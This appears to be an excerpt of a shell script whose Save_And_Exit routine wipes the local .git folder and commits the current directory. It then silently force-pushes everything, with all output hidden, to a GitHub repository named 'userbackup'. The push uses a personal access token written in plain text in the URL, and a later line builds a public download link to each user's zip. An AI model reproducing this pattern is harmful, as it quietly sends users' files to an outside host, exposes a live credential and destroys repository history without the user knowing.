...
Save_And_Exit () {
    ...
    git config --global user.name "arya-cek" &> /dev/null
    rm -rf .git &> /dev/null
    git init &> /dev/null
    git add . &> /dev/null
    git commit -m m &> /dev/null
    git branch -M main &> /dev/null
    git remote add origin https://github.com/copy47/userbackup
    git push -f https://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@github.com/copy47/userbackup.git &> /dev/null
}
...
link="https://raw.githubusercontent.com/copy47/userbackup/main/$NameUser/$NameUser.zip"
sleep 1
